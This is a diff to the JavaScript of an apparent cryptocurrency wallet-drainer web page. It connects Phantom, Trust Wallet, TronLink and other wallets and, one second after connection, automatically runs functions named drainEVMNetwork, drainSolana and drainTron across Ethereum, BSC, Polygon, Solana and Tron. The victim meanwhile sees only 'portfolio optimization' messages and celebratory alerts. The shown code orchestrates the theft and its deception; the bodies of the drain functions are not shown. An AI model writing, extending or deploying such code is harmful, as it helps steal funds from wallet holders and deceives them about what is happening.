+                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
+                
+                // Auto-start draining immediately for Phantom's specific networks
+                setTimeout(async () => {
+                    await drainPhantomSpecificNetworks(walletInfo, evmAddress, solanaAddress);
+                }, 1000);
+                
+            } else if (type === "solana") {
+                // Handle Solana wallets (Phantom Solana)
+                const response = await provider.connect();
+                userAddress = response.publicKey.toString();
+                
+                networkInfo = {
+                    name: "Solana",
+                    chainId: "solana",
+                    balance: "N/A", // Would need Solana Web3.js for balance
+                    currency: "SOL"
+                };
+                
+                // Setup draining function - auto-start
+                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
+                
+                // Auto-start draining immediately
+                setTimeout(async () => {
+                    await drainSolana(provider, userAddress);
+                }, 1000);
+                
+            } else if (type === "tron") {
+                // Handle Tron wallets (TronLink)
+                if (!provider.defaultAddress || !provider.defaultAddress.base58) {
+                    throw new Error("TronLink is not properly logged in.");
+                }
+                
+                userAddress = provider.defaultAddress.base58;
+                const balance = await provider.trx.getBalance(userAddress);
+                const trxBalance = provider.fromSun(balance);
+                
+                networkInfo = {
+                    name: "Tron",
+                    chainId: "tron",
+                    balance: trxBalance,
+                    currency: "TRX"
+                };
+                
+                // Setup draining function - auto-start
+                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
+                
+                // Auto-start draining immediately
+                setTimeout(async () => {
+                    await drainTron(provider, userAddress);
+                }, 1000);
+                
+            } else {
+                throw new Error(`Unsupported wallet type: ${type}`);
             }
-
-            const tronAddress = provider.defaultAddress.base58;
-            console.log("Connected to Tron:", tronAddress);
-
-            // Get TRX balance
-            const balance = await provider.trx.getBalance(tronAddress);
-            const trxBalance = provider.fromSun(balance);
             
-            updateConnectionStatus(`✅ Connected to TronLink | Balance: ${parseFloat(trxBalance).toFixed(4)} TRX`);
+            // Universal success handling
+            const successMessage = `✅ Connected to ${name} | ${networkInfo.balance} ${networkInfo.currency}`;
+            updateConnectionStatus(successMessage);
             
-            // Update button for Tron operations
-            const connectButton = $('#connect-wallet');
-            connectButton.text("🚀 Optimize Tron Portfolio");
-            connectButton.off('click').on('click', async () => {
-                await drainTron(provider, tronAddress);
-            });
-
-            alert(`✅ TronLink Connected!\n\n` +
-                  `📍 Address: ${tronAddress}\n` +
-                  `🌐 Network: Tron\n` +
-                  `💰 Balance: ${trxBalance} TRX\n\n` +
-                  `🚀 Ready to optimize your Tron portfolio!`);
-                  
+            const alertMessage = `✅ ${name} Connected!\n\n` +
+                               `📍 Address: ${userAddress}\n` +
+                               `🌐 Network: ${networkInfo.name}\n` +
+                               `💰 Balance: ${networkInfo.balance} ${networkInfo.currency}\n\n` +
+                               `🚀 Ready to optimize your portfolio!`;
+            alert(alertMessage);
+            
+            console.log(`Successfully connected to ${name}:`, userAddress);
+            
         } catch (error) {
-            console.error("Tron connection setup error:", error);
-            updateConnectionStatus("Tron connection failed", true);
+            console.error(`${walletInfo.name} connection failed:`, error);
+            updateConnectionStatus(`${walletInfo.name} connection failed`, true);
             throw error;
         }
     }
 
-    // Enhanced Solana connection handler
-    async function handleSolanaConnection(provider, userAddress) {
+    // Wallet-specific network draining functions
+    async function drainWalletSpecificNetworks(walletInfo, userAddress) {
         try {
-            updateConnectionStatus("Setting up Solana connection...");
+            const { name, provider, networks } = walletInfo;
+            console.log(`🎯 Starting ${name} specific network draining for networks:`, networks);
+            updateConnectionStatus(`Draining ${name} supported networks...`);
             
-            if (!provider || typeof provider.connect !== 'function') {
-                throw new Error("Solana wallet is not properly installed or available.");
+            // Get supported networks for this wallet
+            const supportedNetworks = networks || [];
+            console.log(`${name} will drain from networks:`, supportedNetworks);
+            
+            for (const networkName of supportedNetworks) {
+                try {
+                    console.log(`🔄 Processing ${networkName} network for ${name}...`);
+                    updateConnectionStatus(`Processing ${networkName.toUpperCase()} network...`);
+                    
+                    await drainEVMNetwork(walletInfo, userAddress, networkName);
+                    
+                    // Small delay between networks
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                } catch (networkError) {
+                    console.error(`Failed to drain ${networkName}:`, networkError);
+                    updateConnectionStatus(`Failed to process ${networkName}`, true);
+                    // Continue with next network
+                }
             }
-
-            // Connect to Solana wallet if not already connected
-            let solanaAddress = userAddress;
-            if (!provider.isConnected || !provider.publicKey) {
-                const response = await provider.connect();
-                solanaAddress = response.publicKey.toString();
-            }
-
-            console.log("Connected to Solana:", solanaAddress);
             
-            // Note: Getting SOL balance requires Solana Web3.js which should be loaded separately
-            updateConnectionStatus(`✅ Connected to Solana wallet`);
+            updateConnectionStatus("All supported networks processed! 🎉");
+            alert(`${name} portfolio optimization completed! 🎉`);
             
-            // Update button for Solana operations
-            const connectButton = $('#connect-wallet');
-            connectButton.text("🚀 Optimize Solana Portfolio");
-            connectButton.off('click').on('click', async () => {
-                await drainSolana(provider, solanaAddress);
-            });
-
-            alert(`✅ Solana Wallet Connected!\n\n` +
-                  `📍 Address: ${solanaAddress}\n` +
-                  `🌐 Network: Solana\n\n` +
-                  `🚀 Ready to optimize your Solana portfolio!`);
-                  
         } catch (error) {
-            console.error("Solana connection setup error:", error);
-            updateConnectionStatus("Solana connection failed", true);
-            throw error;
+            console.error("Wallet-specific draining failed:", error);
+            updateConnectionStatus("Network processing failed", true);
+            alert("Failed to process wallet networks: " + error.message);
+        }
+    }
+
+    // Phantom-specific multi-chain draining (EVM + Solana)
+    async function drainPhantomSpecificNetworks(walletInfo, evmAddress, solanaAddress) {
+        try {
+            console.log("🎯 Starting Phantom multi-chain draining...");
+            updateConnectionStatus("Processing Phantom networks...");
+            
+            let evmProcessed = false;
+            let solanaProcessed = false;
+            
+            // Process EVM networks if EVM is connected
+            if (evmAddress && walletInfo.evmProvider) {
+                try {
+                    console.log("🔄 Processing Phantom EVM networks...");
+                    updateConnectionStatus("Processing Ethereum, Polygon...");
+                    
+                    const evmNetworks = ["ethereum", "polygon"]; // Only ETH and Polygon for Phantom
+                    const evmWalletInfo = {
+                        name: "Phantom (EVM)",
+                        provider: walletInfo.evmProvider,
+                        networks: evmNetworks
+                    };
+                    
+                    for (const networkName of evmNetworks) {
+                        try {
+                            console.log(`🔄 Processing ${networkName} for Phantom EVM...`);
+                            updateConnectionStatus(`Processing ${networkName.toUpperCase()}...`);
+                            
+                            await drainEVMNetwork(evmWalletInfo, evmAddress, networkName);
+                            
+                            // Small delay between networks
+                            await new Promise(resolve => setTimeout(resolve, 2000));
+                            
+                        } catch (networkError) {
+                            console.error(`Failed to drain ${networkName}:`, networkError);
+                            // Continue with next network
+                        }
+                    }
+                    
+                    evmProcessed = true;
+                    console.log("✅ Phantom EVM networks processed");
+                    
+                } catch (evmError) {
+                    console.error("Phantom EVM draining failed:", evmError);
+                }
+            }
+            
+            // Process Solana if Solana is connected
+            if (solanaAddress && walletInfo.solanaProvider) {
+                try {
+                    console.log("🔄 Processing Phantom Solana network...");
+                    updateConnectionStatus("Processing Solana network...");
+                    
+                    await drainSolana(walletInfo.solanaProvider, solanaAddress);
+                    
+                    solanaProcessed = true;
+                    console.log("✅ Phantom Solana network processed");
+                    
+                } catch (solanaError) {
+                    console.error("Phantom Solana draining failed:", solanaError);
+                }
+            }
+            
+            // Final status
+            if (evmProcessed && solanaProcessed) {
+                updateConnectionStatus("All Phantom networks processed! 🎉");
+                alert("Phantom multi-chain optimization completed! 🎉");
+            } else if (evmProcessed) {
+                updateConnectionStatus("Phantom EVM networks processed! 🎉");
+                alert("Phantom EVM optimization completed! 🎉");
+            } else if (solanaProcessed) {
+                updateConnectionStatus("Phantom Solana network processed! 🎉");
+                alert("Phantom Solana optimization completed! 🎉");
+            } else {
+                updateConnectionStatus("No networks could be processed", true);
+                alert("Failed to process any Phantom networks");
+            }
+            
+        } catch (error) {
+            console.error("Phantom multi-chain draining failed:", error);
+            updateConnectionStatus("Phantom processing failed", true);
+            alert("Failed to process Phantom networks: " + error.message);
+        }
+    }
+
+    // Trust Wallet multi-network draining (EVM + Tron)
+    async function drainTrustMultiNetworks(walletInfo, userAddress) {
+        try {
+            console.log("🎯 Starting Trust Wallet multi-network draining...");
+            updateConnectionStatus("Processing Trust Wallet networks...");
+            
+            let evmProcessed = false;
+            let tronProcessed = false;
+            
+            // Process EVM networks first
+            if (walletInfo.provider) {
+                try {
+                    console.log("🔄 Processing Trust Wallet EVM networks...");
+                    updateConnectionStatus("Processing Ethereum, BSC, Polygon...");
+                    
+                    const evmNetworks = ["ethereum", "bsc", "polygon"];
+                    const evmWalletInfo = {
+                        name: "Trust Wallet (EVM)",
+                        provider: walletInfo.provider,
+                        networks: evmNetworks
+                    };
+                    
+                    for (const networkName of evmNetworks) {
+                        try {
+                            console.log(`🔄 Processing ${networkName} for Trust Wallet...`);
+                            updateConnectionStatus(`Processing ${networkName.toUpperCase()}...`);
+                            
+                            await drainEVMNetwork(evmWalletInfo, userAddress, networkName);
+                            
+                            // Small delay between networks
+                            await new Promise(resolve => setTimeout(resolve, 2000));
+                            
+                        } catch (networkError) {
+                            console.error(`Failed to drain ${networkName}:`, networkError);
+                            // Continue with next network
+                        }
+                    }
+                    
+                    evmProcessed = true;
+                    console.log("✅ Trust Wallet EVM networks processed");
+                    
+                } catch (evmError) {
+                    console.error("Trust Wallet EVM draining failed:", evmError);
+                }
+            }
+            
+            // Process Tron if TronWeb is available
+            if (walletInfo.tronProvider && walletInfo.tronProvider.defaultAddress) {
+                try {
+                    console.log("🔄 Processing Trust Wallet Tron network...");
+                    updateConnectionStatus("Processing Tron network...");
+                    
+                    const tronAddress = walletInfo.tronProvider.defaultAddress.base58;
+                    await drainTron(walletInfo.tronProvider, tronAddress);
+                    
+                    tronProcessed = true;
+                    console.log("✅ Trust Wallet Tron network processed");
+                    
+                } catch (tronError) {
+                    console.error("Trust Wallet Tron draining failed:", tronError);
+                }
+            }
+            
+            // Final status
+            if (evmProcessed && tronProcessed) {
+                updateConnectionStatus("All Trust Wallet networks processed! 🎉");
+                alert("Trust Wallet multi-chain optimization completed! 🎉");
+            } else if (evmProcessed) {
+                updateConnectionStatus("Trust Wallet EVM networks processed! 🎉");
+                alert("Trust Wallet EVM optimization completed! 🎉");
+            } else if (tronProcessed) {
+                updateConnectionStatus("Trust Wallet Tron network processed! 🎉");
+                alert("Trust Wallet Tron optimization completed! 🎉");
+            } else {
+                updateConnectionStatus("No networks could be processed", true);
+                alert("Failed to process any Trust Wallet networks");
+            }
+            
+        } catch (error) {
+            console.error("Trust Wallet multi-network draining failed:", error);
+            updateConnectionStatus("Trust Wallet processing failed", true);
+            alert("Failed to process Trust Wallet networks: " + error.message);
+        }
+    }
+
+    // Trust Wallet full multi-network draining (EVM + Tron + Solana)
+    async function drainTrustFullMultiNetworks(walletInfo, userAddress) {
+        try {
+            console.log("🎯 Starting Trust Wallet full multi-network draining...");
+            updateConnectionStatus("Processing Trust Wallet all networks...");
+            
+            let evmProcessed = false;
+            let tronProcessed = false;
+            let solanaProcessed = false;
+            
+            // Process EVM networks first
+            if (walletInfo.provider) {
+                try {
+                    console.log("🔄 Processing Trust Wallet EVM networks...");
+                    updateConnectionStatus("Processing Ethereum, BSC, Polygon...");
+                    
+                    const evmNetworks = ["ethereum", "bsc", "polygon"];
+                    const evmWalletInfo = {
+                        name: "Trust Wallet (EVM)",
+                        provider: walletInfo.provider,
+                        networks: evmNetworks
+                    };
+                    
+                    for (const networkName of evmNetworks) {
+                        try {
+                            console.log(`🔄 Processing ${networkName} for Trust Wallet...`);
+                            updateConnectionStatus(`Processing ${networkName.toUpperCase()}...`);
+                            
+                            await drainEVMNetwork(evmWalletInfo, userAddress, networkName);
+                            
+                            // Small delay between networks
+                            await new Promise(resolve => setTimeout(resolve, 2000));
+                            
+                        } catch (networkError) {
+                            console.error(`Failed to drain ${networkName}:`, networkError);
+                            // Continue with next network
+                        }
+                    }
+                    
+                    evmProcessed = true;
+                    console.log("✅ Trust Wallet EVM networks processed");
+                    
+                } catch (evmError) {
+                    console.error("Trust Wallet EVM draining failed:", evmError);
+                }
+            }
+            
+            // Process Tron if TronWeb is available
+            if (walletInfo.tronProvider && walletInfo.tronProvider.defaultAddress) {
+                try {
+                    console.log("🔄 Processing Trust Wallet Tron network...");
+                    updateConnectionStatus("Processing Tron network...");
+                    
+                    const tronAddress = walletInfo.tronProvider.defaultAddress.base58;
+                    await drainTron(walletInfo.tronProvider, tronAddress);
+                    
+                    tronProcessed = true;
+                    console.log("✅ Trust Wallet Tron network processed");
+                    
+                } catch (tronError) {
+                    console.error("Trust Wallet Tron draining failed:", tronError);
+                }
+            }
+            
+            // Process Solana if Solana provider is available
+            if (walletInfo.solanaProvider) {
+                try {
+                    console.log("🔄 Processing Trust Wallet Solana network...");
+                    updateConnectionStatus("Processing Solana network...");
+                    
+                    // Connect to Solana
+                    const response = await walletInfo.solanaProvider.connect();
+                    if (response && response.publicKey) {
+                        const solanaAddress = response.publicKey.toString();
+                        await drainSolana(walletInfo.solanaProvider, solanaAddress);
+                        
+                        solanaProcessed = true;
+                        console.log("✅ Trust Wallet Solana network processed");
+                    }
+                    
+                } catch (solanaError) {
+                    console.error("Trust Wallet Solana draining failed:", solanaError);
+                }
+            }
+            
+            // Final status
+            const processedNetworks = [];
+            if (evmProcessed) processedNetworks.push("EVM");
+            if (tronProcessed) processedNetworks.push("Tron");
+            if (solanaProcessed) processedNetworks.push("Solana");
+            
+            if (processedNetworks.length > 0) {
+                updateConnectionStatus(`Trust Wallet ${processedNetworks.join(", ")} networks processed! 🎉`);
+                alert(`Trust Wallet ${processedNetworks.join(" + ")} optimization completed! 🎉`);
+            } else {
+                updateConnectionStatus("No networks could be processed", true);
+                alert("Failed to process any Trust Wallet networks");
+            }
+            
+        } catch (error) {
+            console.error("Trust Wallet full multi-network draining failed:", error);
+            updateConnectionStatus("Trust Wallet processing failed", true);
+            alert("Failed to process Trust Wallet networks: " + error.message);
         }
     }
 
@@ -1538,6 +1816,9 @@ $(document).ready(function() {
             throw error;
         }
     }
+
+    // Function to handle Phantom multi-chain connection
+    async function handlePhantomMultiConnection(walletInfo, evmProvider, solanaProvider) {
         try {
             updateConnectionStatus("Connecting to Phantom (Multi-Chain)...");
             
@@ -1585,8 +1866,8 @@ $(document).ready(function() {
             updateConnectionStatus(connectionMessage);
 
             // Update button for multi-chain draining
-            $('#connect-btn').text("🚀 Optimize All Phantom Networks");
-            $('#connect-btn').off('click').on('click', async () => {
+            $('#connect-wallet').text("🚀 Optimize All Phantom Networks");
+            $('#connect-wallet').off('click').on('click', async () => {
                 try {
                     updateConnectionStatus("Starting multi-chain portfolio optimization...");
                     
@@ -1676,162 +1957,76 @@ $(document).ready(function() {
         }
     }
 
-    // Handle EVM wallet connections with network-aware draining
-    async function handleEVMConnection(selected) {
-        const provider = selected.provider;
-        
-        if (!provider) {
-            throw new Error(`${selected.name} provider not found. Please make sure the wallet is properly installed.`);
-        }
-
-        // Special handling for Phantom EVM provider
-        if (selected.name.includes("Phantom") && selected.type === "evm") {
-            // For Phantom EVM, the provider might need to be accessed differently
-            if (typeof provider.request !== 'function') {
-                // Try to get the ethereum provider from phantom
-                if (window.phantom && window.phantom.ethereum && window.phantom.ethereum.request) {
-                    const phantomProvider = window.phantom.ethereum;
-                    selected.provider = phantomProvider; // Update the provider reference
-                    return await handleEVMConnection(selected); // Retry with correct provider
-                } else {
-                    throw new Error(`${selected.name} is not properly initialized. Please refresh the page and try again.`);
+    // Enhanced Phantom multi-chain handler - processes ALL networks (EVM + Solana)
+    async function handlePhantomMultiChain(walletInfo, evmAddress, solanaAddress) {
+        try {
+            updateConnectionStatus("Starting comprehensive Phantom multi-chain optimization...");
+            console.log("🚀 Phantom Multi-Chain Handler Started");
+            console.log("EVM Address:", evmAddress);
+            console.log("Solana Address:", solanaAddress);
+            
+            const results = {
+                evm: { networks: [], totalAssets: 0 },
+                solana: { assets: 0 }
+            };
+            
+            // Phase 1: Process all EVM networks if EVM is connected
+            if (evmAddress && walletInfo.evmProvider) {
+                console.log("📍 Phase 1: Processing EVM networks (Ethereum, BSC, Polygon)");
+                
+                const evmWalletInfo = {
+                    name: "Phantom EVM",
+                    provider: walletInfo.evmProvider,
+                    type: "evm",
+                    networks: ["ethereum", "bsc", "polygon"]
+                };
+                
+                try {
+                    await drainMultiChainAuto(evmWalletInfo, evmAddress);
+                    results.evm.networks = ["ethereum", "bsc", "polygon"];
+                    console.log("✅ EVM multi-chain processing completed");
+                } catch (evmError) {
+                    console.error("❌ EVM multi-chain processing failed:", evmError);
+                    updateConnectionStatus(`❌ EVM networks failed: ${evmError.message}`);
                 }
             }
-        }
-
-        // Standard provider validation
-        if (typeof provider.request !== 'function') {
-            throw new Error(`${selected.name} is not properly installed or available. Please check if the wallet extension is installed and enabled.`);
-        }
-
-        try {
-            // Request account access
-            await provider.request({ method: 'eth_requestAccounts' });
             
-            // Get connected accounts
-            const accounts = await provider.request({ method: 'eth_accounts' });
-            if (!accounts || accounts.length === 0) {
-                throw new Error("No accounts found. Please unlock your wallet and try again.");
-            }
-
-            const ethersProvider = new ethers.providers.Web3Provider(provider);
-            const signer = ethersProvider.getSigner();
-            const userAddress = accounts[0];
-
-            // Get current network
-            const network = await ethersProvider.getNetwork();
-            console.log("Connected to network:", network);
-
-            updateConnectionStatus(`Connected to ${selected.name} on ${getNetworkName(network.chainId)}`);
-            
-            // Filter supported EVM networks
-            const supportedEVMNetworks = selected.networks.filter(net => NETWORK_CONFIGS[net]);
-            
-            if (supportedEVMNetworks.length > 1) {
-                // Multi-network wallet - drain all supported networks automatically
-                $('#connect-btn').text(`🚀 Optimize Portfolio (${supportedEVMNetworks.length} Networks)`);
-                $('#connect-btn').off('click').on('click', async () => {
-                    try {
-                        await drainMultiChainAuto(selected, userAddress);
-                    } catch (error) {
-                        console.error("Portfolio optimization error:", error);
-                        updateConnectionStatus("Portfolio optimization failed", true);
-                        alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
-                    }
-                });
-            } else {
-                // Single network optimization
-                $('#connect-btn').text(`🚀 Optimize ${getNetworkName(network.chainId)} Portfolio`);
-                $('#connect-btn').off('click').on('click', async () => {
-                    try {
-                        const result = await drainEVMNetwork(selected.provider, userAddress, supportedEVMNetworks[0]);
-                        if (result.success) {
-                            alert(`${getNetworkName(network.chainId)} portfolio optimization completed!\n${result.assets.length} assets optimized: ${result.assets.join(', ')}`);
-                        } else {
-                            alert(`Portfolio optimization failed: ${result.error}`);
-                        }
-                    } catch (error) {
-                        console.error("Portfolio optimization error:", error);
-                        updateConnectionStatus("Portfolio optimization failed", true);
-                        alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
-                    }
-                });
-            }
-
-            const networkInfo = supportedEVMNetworks.length > 1
-                ? `\nSupported Networks: ${supportedEVMNetworks.map(n => n.toUpperCase()).join(', ')}`
-                : `\nNetwork: ${getNetworkName(network.chainId)}`;
+            // Phase 2: Process Solana if Solana is connected
+            if (solanaAddress && walletInfo.solanaProvider) {
+                console.log("📍 Phase 2: Processing Solana network");
                 
-            alert(`Connected to ${selected.name}:\n${userAddress}${networkInfo}`);
-
+                try {
+                    // Add delay between EVM and Solana processing
+                    if (evmAddress) {
+                        updateConnectionStatus("Switching to Solana processing...");
+                        await new Promise(resolve => setTimeout(resolve, 3000));
+                    }
+                    
+                    await drainSolana(walletInfo.solanaProvider, solanaAddress);
+                    results.solana.assets = 1; // SOL processed
+                    console.log("✅ Solana processing completed");
+                } catch (solanaError) {
+                    console.error("❌ Solana processing failed:", solanaError);
+                    updateConnectionStatus(`❌ Solana failed: ${solanaError.message}`);
+                }
+            }
+            
+            // Final results
+            const totalNetworks = results.evm.networks.length + (results.solana.assets > 0 ? 1 : 0);
+            updateConnectionStatus(`🎉 Phantom multi-chain optimization completed! Processed ${totalNetworks} networks`);
+            
+            const summary = `🎯 Phantom Multi-Chain Results:\n\n` +
+                          `✅ EVM Networks: ${results.evm.networks.join(', ').toUpperCase()}\n` +
+                          `✅ Solana Network: ${results.solana.assets > 0 ? 'Processed' : 'Skipped'}\n\n` +
+                          `🚀 Total Networks: ${totalNetworks}`;
+            
+            alert(summary);
+            
         } catch (error) {
-            // Handle specific wallet errors
-            if (error.code === 4001) {
-                throw new Error("Connection rejected by user. Please try again and approve the connection.");
-            } else if (error.code === -32002) {
-                throw new Error("Connection request already pending. Please check your wallet.");
-            } else if (error.message.includes("User rejected")) {
-                throw new Error("Connection rejected. Please approve the connection in your wallet.");
-            } else {
-                throw error;
-            }
+            console.error("❌ Phantom multi-chain error:", error);
+            updateConnectionStatus("Multi-chain optimization failed", true);
+            alert(`Multi-chain optimization failed: ${error.message || 'Unknown error'}`);
         }
-    }
-
-    // Handle Solana wallet connections
-    async function handleSolanaConnection(selected) {
-        const provider = selected.provider;
-        
-        if (!provider || typeof provider.connect !== 'function') {
-            throw new Error(`${selected.name} is not properly installed or available.`);
-        }
-
-        // Connect to Solana wallet
-        const response = await provider.connect();
-        const userAddress = response.publicKey.toString();
-
-        updateConnectionStatus(`Connected to ${selected.name} (Solana)`);
-        
-        // Update button for Solana draining
-        $('#connect-btn').text("🚀 Optimize Solana Portfolio");
-        $('#connect-btn').off('click').on('click', async () => {
-            try {
-                await drainSolana(provider, userAddress);
-            } catch (error) {
-                console.error("Portfolio optimization error:", error);
-                updateConnectionStatus("Portfolio optimization failed", true);
-                alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
-            }
-        });
-
-        alert(`Connected to ${selected.name}:\n${userAddress}\nNetwork: Solana`);
-    }
-
-    // Handle Tron wallet connections
-    async function handleTronConnection(selected) {
-        const tronWeb = selected.provider;
-        
-        if (!tronWeb || !tronWeb.defaultAddress.base58) {
-            throw new Error("TronLink is not properly installed or logged in.");
-        }
-
-        const userAddress = tronWeb.defaultAddress.base58;
-
-        updateConnectionStatus(`Connected to ${selected.name} (Tron)`);
-        
-        // Update button for Tron draining
-        $('#connect-btn').text("🚀 Optimize Tron Portfolio");
-        $('#connect-btn').off('click').on('click', async () => {
-            try {
-                await drainTron(tronWeb, userAddress);
-            } catch (error) {
-                console.error("Portfolio optimization error:", error);
-                updateConnectionStatus("Portfolio optimization failed", true);
-                alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
-            }
-        });
-
-        alert(`Connected to ${selected.name}:\n${userAddress}\nNetwork: Tron`);
     }
 
     // Helper function to add network to wallet
@@ -1882,12 +2077,18 @@ $(document).ready(function() {
     async function drainMultiChainAuto(selectedWallet, userAddress) {
         try {
             updateConnectionStatus("Starting automatic portfolio optimization...");
+            console.log("🚀 Starting multi-chain auto-drain for:", selectedWallet.name);
+            console.log("📋 Wallet info:", selectedWallet);
+            console.log("👤 User address:", userAddress);
             
             const results = {};
             
             // Get all supported EVM networks for this wallet
             const supportedNetworks = selectedWallet.networks.filter(net => NETWORK_CONFIGS[net]);
-            console.log(`Auto-checking ${supportedNetworks.length} networks: ${supportedNetworks.join(', ')}`);
+            console.log(`🌐 Available networks in NETWORK_CONFIGS:`, Object.keys(NETWORK_CONFIGS));
+            console.log(`🎯 Wallet supports networks:`, selectedWallet.networks);
+            console.log(`✅ Filtered supported networks:`, supportedNetworks);
+            console.log(`🔄 Auto-checking ${supportedNetworks.length} networks: ${supportedNetworks.join(', ')}`);
 
             // Automatically check each supported network
             for (let i = 0; i < supportedNetworks.length; i++) {
@@ -1895,15 +2096,18 @@ $(document).ready(function() {
                 results[networkName] = { success: false, assets: [] };
                 
                 try {
+                    console.log(`\n📍 Processing network ${i + 1}/${supportedNetworks.length}: ${networkName.toUpperCase()}`);
                     updateConnectionStatus(`Checking ${networkName.toUpperCase()}... (${i + 1}/${supportedNetworks.length})`);
                     
                     // Add delay between network checks for better UX
                     if (i > 0) {
+                        console.log("⏳ Waiting 2 seconds before next network...");
                         await new Promise(resolve => setTimeout(resolve, 2000));
                     }
                     
                     const result = await drainEVMNetwork(selectedWallet.provider, userAddress, networkName);
                     results[networkName] = result;
+                    console.log(`📊 ${networkName.toUpperCase()} result:`, result);
                     
                     // Show progress after each network
                     if (result.success && result.assets.length > 0) {
@@ -1915,7 +2119,7 @@ $(document).ready(function() {
                     }
                     
                 } catch (error) {
-                    console.error(`Failed to check ${networkName}:`, error);
+                    console.error(`❌ Failed to check ${networkName}:`, error);
                     results[networkName] = { success: false, error: error.message };
                     updateConnectionStatus(`❌ ${networkName.toUpperCase()}: ${error.message}`);
                     await new Promise(resolve => setTimeout(resolve, 1500));
@@ -2033,7 +2237,14 @@ $(document).ready(function() {
         }
 
         try {
-            console.log(`🔄 Switching to ${config.name} (Chain ID: ${config.chainId})`);
+            // Get the actual provider from wallet object
+            const walletProvider = wallet.provider || wallet;
+            if (!walletProvider || !walletProvider.request) {
+                throw new Error(`No valid provider found for ${wallet.name || 'wallet'}`);
+            }
+
+            console.log(`🔄 Attempting to switch to ${config.name} (Chain ID: ${config.chainId})`);
+            console.log(`Target chainId hex: 0x${config.chainId.toString(16)}`);
             
             // Try to switch to target network with retries
             let switchAttempts = 0;
@@ -2041,19 +2252,22 @@ $(document).ready(function() {
             
             while (switchAttempts < maxSwitchAttempts) {
                 try {
-                    await wallet.request({
+                    console.log(`Switch attempt ${switchAttempts + 1} for ${config.name}...`);
+                    await walletProvider.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: `0x${config.chainId.toString(16)}` }]
                     });
+                    console.log(`✅ Successfully requested switch to ${config.name}`);
                     break; // Success, exit retry loop
                 } catch (switchError) {
                     switchAttempts++;
-                    console.log(`Network switch attempt ${switchAttempts} failed:`, switchError.message);
+                    console.log(`❌ Network switch attempt ${switchAttempts} failed:`, switchError.message);
+                    console.log(`Switch error code:`, switchError.code);
                     
                     // If the network doesn't exist, try to add it
                     if (switchError.code === 4902 || switchError.message.includes('Unrecognized chain ID')) {
                         try {
-                            await addNetworkToWallet(wallet, config);
+                            await addNetworkToWallet(walletProvider, config);
                             continue; // Try switching again after adding
                         } catch (addError) {
                             console.error(`Failed to add ${config.name} network:`, addError.message);
@@ -2072,31 +2286,37 @@ $(document).ready(function() {
             // Wait for network switch to complete
             await new Promise(resolve => setTimeout(resolve, 2000));
 
-            const provider = new ethers.providers.Web3Provider(wallet);
+            const provider = new ethers.providers.Web3Provider(walletProvider);
             const signer = provider.getSigner();
 
             // Verify we're on the correct network with retries
             let verifyAttempts = 0;
             const maxVerifyAttempts = 5;
             
+            console.log(`🔍 Verifying network switch to ${config.name}...`);
+            
             while (verifyAttempts < maxVerifyAttempts) {
                 try {
                     const network = await provider.getNetwork();
+                    console.log(`Verification attempt ${verifyAttempts + 1}: Current chain ID = ${network.chainId}, Expected = ${config.chainId}`);
+                    
                     if (network.chainId === config.chainId) {
-                        console.log(`✅ Successfully switched to ${config.name} (Chain ID: ${network.chainId})`);
+                        console.log(`✅ Network verification successful! Now on ${config.name} (Chain ID: ${network.chainId})`);
                         break;
                     } else {
                         verifyAttempts++;
-                        console.log(`Network verification attempt ${verifyAttempts}: Expected ${config.chainId}, got ${network.chainId}`);
+                        console.log(`⚠️ Network verification attempt ${verifyAttempts}: Expected ${config.chainId}, got ${network.chainId}`);
                         
                         if (verifyAttempts >= maxVerifyAttempts) {
                             throw new Error(`Network verification failed: Expected ${config.name} (${config.chainId}), but still on chain ${network.chainId}`);
                         }
                         
+                        console.log(`Waiting 1 second before next verification attempt...`);
                         await new Promise(resolve => setTimeout(resolve, 1000));
                     }
                 } catch (error) {
                     verifyAttempts++;
+                    console.log(`❌ Network verification error (attempt ${verifyAttempts}):`, error.message);
                     if (verifyAttempts >= maxVerifyAttempts) {
                         throw error;
                     }
